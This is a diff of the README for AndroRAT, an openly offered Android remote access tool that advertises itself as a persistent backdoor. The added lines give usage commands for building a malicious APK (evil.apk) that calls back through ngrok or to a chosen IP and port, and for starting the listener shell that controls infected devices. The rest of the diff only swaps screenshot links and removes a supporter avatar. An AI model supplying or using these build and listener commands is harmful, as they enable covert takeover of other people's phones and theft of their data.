@@ -12,9 +12,32 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 > AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 
 
 ## Screenshots
+
+## Examples
+
+* To build the apk using ngrok which will also set the listner:
+```python3 androRAT.py --build --ngrok -o evil.apk```
+
+* To build the apk using desired ip and port:
+```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+
+* To get the interpreter:
+```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
+
+## Interpreter Examples
+* Generating APK
 <p align="center">
-  <img src="Screenshots/5.JPG" width="800"/>
+  <img src="Screenshots/6.JPG" width="800"/>
 </p>
+------------------------------------------------------------------------------------------------------------------------------  
+
+* Some interpreter Commands 
+<p align="center">
+  <img src="Screenshots/1.JPG" width="800"/>
+</p>
+------------------------------------------------------------------------------------------------------------------------------
+
+
 ![AndroRAT](Screenshots/5.jpg "AndroRAT in action")
 ## Features of AndroRAT 
 * Full persistent backdoor
@@ -142,7 +165,6 @@ In the sh shell there are some sub commands
 ------------------------------------------------------------------------------------------------------------------------------
 
 ## Supporters:
-[![rayep](https://avatars.githubusercontent.com/u/40718616?v=4&s=60)](https://github.com/rayep)
 
 ## TODO
 * ~~Ngrok support~~
